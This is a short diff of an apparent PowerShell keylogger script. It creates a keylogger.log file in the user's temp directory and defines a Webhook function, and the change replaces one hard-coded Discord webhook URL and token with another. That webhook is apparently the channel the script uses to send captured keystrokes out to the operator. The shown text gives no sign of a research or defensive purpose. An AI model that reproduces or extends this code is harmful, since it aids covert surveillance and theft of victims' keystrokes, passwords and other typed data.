@@ -4,7 +4,7 @@
  
  $generateLog = New-Item -Path $env:temp/keylogger.log -ItemType File -Force
 
- function Webhook($webhook = 'https://discord.com/api/webhooks/943067412323000320/bWtZ0l9PefQb5K9Y1L_2T1X-nq4AykzZI28Jlp6VhYk9SDsTkjJ94bB_1R4KkPWdBnZW'){
+ function Webhook($webhook = 'https://discord.com/api/webhooks/945312004728582165/y4E63O32Qxa-2pwakeuGXaI7KhchlUjrcsM7iD55HcZcUn65hGn-QhLlcvWFKgDb6O10'){
 
 #Create embed array
     [System.Collections.ArrayList]$embedArray = @()
